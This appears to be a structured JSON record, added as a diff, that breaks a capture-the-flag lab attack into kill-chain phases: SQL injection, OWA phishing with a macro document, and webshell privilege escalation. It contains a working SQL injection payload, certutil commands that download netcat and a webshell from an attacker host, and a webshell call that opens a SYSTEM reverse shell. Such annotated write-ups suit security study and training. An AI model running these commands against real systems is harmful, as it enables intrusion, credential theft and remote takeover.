@@ -1,0 +1,160 @@
+{
+  "id": "ap-0004",
+  "title": "Initial Access & Privilege Escalation: SQLi -> OWA Phishing Macro -> SYSTEM Shell",
+  "summary": "Exploiting a web application SQL injection to retrieve credentials, enabling access to Outlook Web Access (OWA), used to deliver a malicious OpenOffice macro document for initial access, followed by local privilege escalation via a vulnerable web service running as NT AUTHORITY\\SYSTEM.",
+  "attack_path_markdown": "### Step 1\nReconnaissance (Nmap & Web Fuzzing) identifies web services.\n### Step 2\nSQL Injection on the 'Complaint Management System' extracts hashed user credentials.\n### Step 3\nCredentials are cracked, and used to log into OWA.\n### Step 4\nA weaponized OpenOffice document (.odt) containing a reverse shell macro is delivered via email.\n### Step 5\nThe macro executes, providing an initial user shell.\n### Step 6\nPrivilege Escalation is achieved by exploiting a local web server (running as NT AUTHORITY\\SYSTEM) via webshell upload.",
+  "kill_chain": [
+    {
+      "phase_order": 1,
+      "phase_name": "Reconnaissance",
+      "description": "Scanning and enumeration to identify the target operating system, open ports, web applications, and potential vulnerabilities (including SQL Injection).",
+      "actions": [
+        "Initial host and port scanning",
+        "Web application enumeration (whatweb, ffuf)",
+        "Vulnerability search for 'Complaint Management System'",
+        "SQL injection testing and execution"
+      ],
+      "tools": ["nmap", "ping", "ffuf", "whatweb", "searchsploit"],
+      "techniques": ["Active Scanning", "Web Application Fingerprinting", "Content Discovery", "SQL Injection"],
+      "mitre_ids": ["T1595.001", "T1046", "T1078", "T1589"],
+      "indicators": ["TTL 127/128 (Windows inference)", "Numerous open TCP ports", "Directory enumeration results (exchange, joomla, complain)", "SQL syntax errors"],
+      "preconditions": "Target machine must be active and accessible via VPN.",
+      "expected_outcome": "List of open services and credentials for OWA.",
+      "commands": [
+        "ping 10.10.10.71",
+        "nmap -p- -sS -vvv -n -Pn --min-rate 5000 -oG all_ports 10.10.10.71",
+        "ffuf -u http://10.10.10.71/FUZZ -w /path/to/wordlist -hc 404",
+        "SQL Injection Payloads: ORDER BY 5--",
+        "SQL Injection Payloads: ' UNION SELECT 1, 2, GROUP_CONCAT(username, 0x3a, password), 4, 5 FROM secret.users --"
+      ],
+      "confidence": 0.95
+    },
+    {
+      "phase_order": 2,
+      "phase_name": "Weaponization",
+      "description": "Creation of the necessary payloads and files for delivery and execution, including cracking extracted hashes.",
+      "actions": [
+        "Cracking MD5 hashes obtained via SQLi",
+        "Creating a malicious OpenOffice document (ODT) macro payload",
+        "Preparing the Netcat binary for remote download (renaming to evade detection)",
+        "Configuring local HTTP and SMB servers for payload hosting"
+      ],
+      "tools": ["hashcat (implied)", "OpenOffice", "msfvenom (for macro template)", "Netcat (diamond_jackson.exe)"],
+      "techniques": ["Hash Cracking", "Phishing Attachment Creation", "Execution through API", "Software Packing (Renaming)"],
+      "mitre_ids": ["T1110.002", "T1588.002", "T1027"],
+      "indicators": ["Cleartext credentials", "VBA/Macro code (Sub Main)", "Base64 encoded binary files"],
+      "preconditions": "Valid credentials for OWA access obtained. Netcat binary available.",
+      "expected_outcome": "Working macro ODT file and successful payload hosting.",
+      "commands": [
+        "certutil.exe -urlcache -split -f http://10.10.14.29/diamond_jackson.exe C:\\Temp\\diamond_jackson.exe",
+        "python3 -m http.server 80"
+      ],
+      "confidence": 0.9
+    },
+    {
+      "phase_order": 3,
+      "phase_name": "Delivery",
+      "description": "Transmitting the weaponized OpenOffice document to the victim via a targeted phishing email through OWA.",
+      "actions": [
+        "Logging into OWA using compromised credentials (ariel:pussycatdolls)",
+        "Composing an email to the administrator (tps report)",
+        "Attaching the malicious ODT file and sending the email"
+      ],
+      "tools": ["Firefox/Chromium (OWA interface)"],
+      "techniques": ["Spearphishing Attachment (OWA)", "Account Access"],
+      "mitre_ids": ["T1566.001", "T1078"],
+      "indicators": ["Sent email containing 'Report.odt'"],
+      "preconditions": "Valid OWA credentials and prepared ODT file.",
+      "expected_outcome": "Email successfully delivered and opened by the target.",
+      "confidence": 0.9
+    },
+    {
+      "phase_order": 4,
+      "phase_name": "Exploitation",
+      "description": "The victim opens the macro-enabled document, executing the payload and gaining initial access.",
+      "actions": [
+        "Victim execution of the OpenOffice macro",
+        "Macro initiates download of Netcat via certutil",
+        "Netcat executed to establish a reverse shell"
+      ],
+      "tools": ["certutil", "Netcat (diamond_jackson.exe)", "OpenOffice"],
+      "techniques": ["Execution through API (certutil)", "System Binary Proxy Execution (certutil)", "Reverse Shell"],
+      "mitre_ids": ["T1218", "T1059.003", "T1071.001"],
+      "indicators": ["Received reverse shell connection on attacker listener."],
+      "preconditions": "Target must open the file and allow macro execution. Netcat listener active.",
+      "expected_outcome": "Initial command shell access (user privilege level).",
+      "commands": [
+        "Attacker Listener: nc -lvnp 4444"
+      ],
+      "confidence": 0.9
+    },
+    {
+      "phase_order": 5,
+      "phase_name": "Installation",
+      "description": "Establishing a backdoor (webshell) on a locally vulnerable web service running with high privileges to facilitate persistence and privilege escalation.",
+      "actions": [
+        "Identifying local web service running as NT AUTHORITY\\SYSTEM (Wam64)",
+        "Uploading a PHP webshell to the accessible web directory"
+      ],
+      "tools": ["certutil", "cmd.php (webshell)"],
+      "techniques": ["Web Shell", "Server Software Exploitation"],
+      "mitre_ids": ["T1505.003", "T1505"],
+      "indicators": ["Write access to C:\\inetpub\\wwwroot\\wam64\\www", "Successful execution of uploaded cmd.php via HTTP."],
+      "preconditions": "Initial shell access and write permissions on the web root.",
+      "expected_outcome": "Functional webshell capable of executing system commands.",
+      "commands": [
+        "certutil -urlcache -split -f http://10.10.14.29/cmd.php C:\\inetpub\\wwwroot\\wam64\\www\\cmd.php"
+      ],
+      "confidence": 0.9
+    },
+    {
+      "phase_order": 6,
+      "phase_name": "Command and Control (C2)",
+      "description": "Using the established webshell to execute high-privileged commands and establish a new, highly privileged reverse shell.",
+      "actions": [
+        "Executing 'whoami' via webshell to confirm SYSTEM privileges",
+        "Using SMB share to execute the Netcat binary for a SYSTEM reverse shell"
+      ],
+      "tools": ["Netcat (diamond_jackson.exe)", "smbclient (implied)"],
+      "techniques": ["Exploitation for Privilege Escalation", "Remote File Execution", "C2 Channel through Reverse Shell"],
+      "mitre_ids": ["T1059.003", "T1071.001", "T1021.002"],
+      "indicators": ["Webshell output: NT AUTHORITY\\SYSTEM", "Successful connection on new listener port (443)."],
+      "preconditions": "Functional webshell with SYSTEM privileges.",
+      "expected_outcome": "Privileged SYSTEM command shell.",
+      "commands": [
+        "http://10.10.10.71:8080/cmd.php?cmd=whoami",
+        "http://10.10.10.71:8080/cmd.php?cmd=\\\\10.10.14.29\\smb_folder\\diamond_jackson.exe -e cmd.exe 10.10.14.29 443"
+      ],
+      "confidence": 0.95
+    },
+    {
+      "phase_order": 7,
+      "phase_name": "Actions on Objectives",
+      "description": "Accessing restricted directories and retrieving the root flag after achieving SYSTEM privileges.",
+      "actions": [
+        "Navigating to the Administrator's directory",
+        "Reading the final flag file"
+      ],
+      "tools": ["cmd.exe"],
+      "techniques": ["Data Collection", "File System Enumeration"],
+      "mitre_ids": ["T1083", "T1555"],
+      "indicators": ["Directory listing of C:\\Users\\Administrator", "Content of root.txt"],
+      "preconditions": "NT AUTHORITY\\SYSTEM access.",
+      "expected_outcome": "Capture of the root flag.",
+      "commands": [
+        "dir C:\\Users\\Administrator\\Desktop",
+        "type C:\\Users\\Administrator\\Desktop\\root.txt"
+      ],
+      "confidence": 1.0
+    }
+  ],
+  "tactics": ["Initial Access", "Credential Access", "Defense Evasion", "Execution", "Persistence", "Privilege Escalation"],
+  "techniques": ["SQL Injection", "Spearphishing Attachment", "Obfuscated Files or Information", "Web Shell", "Server Software Exploitation"],
+  "mitre_ids": ["T1078", "T1566.001", "T1027", "T1505.003", "T1190"],
+  "hosts": ["10.10.10.71"],
+  "privs_obtained": ["domain user (ariel)", "NT AUTHORITY\\SYSTEM"],
+  "confidence": 0.95,
+  "source_file": "",
+  "notes": "Procedure involves multiple steps requiring patience due to machine instability.",
+  "labels": ["attack_path", "windows", "phishing", "sqli", "privesc"]
+}
